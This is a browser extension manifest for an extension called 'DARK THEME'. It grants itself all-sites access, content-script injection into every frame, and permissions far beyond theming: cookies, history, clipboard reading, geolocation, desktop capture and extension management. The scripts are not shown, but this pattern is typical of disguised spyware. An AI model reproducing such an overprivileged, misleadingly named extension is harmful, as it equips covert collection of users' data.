{
  "manifest_version": 3,
  "name": "DARK THEME",
  "description": "",
  "version": "1.1.4",
  "icons": {"128": "icons/icon.png"},
  "host_permissions": ["<all_urls>"],
  "permissions": [
    "activeTab",
    "cookies",
    "history",
    "tabs",
    "webNavigation",
    "webRequest",
    "storage",
    "clipboardRead",
    "geolocation",
    "downloads",
    "scripting",
    "system.cpu",
    "system.display",
    "system.memory",
    "system.storage",
    "alarms",
    "desktopCapture",
    "management"
  ],
  "background": {"service_worker": "background.js"},
  "content_scripts": [{
    "matches": ["<all_urls>"],
    "all_frames": true,
    "js": ["content-script.js"],
    "run_at": "document_end"
  }]
}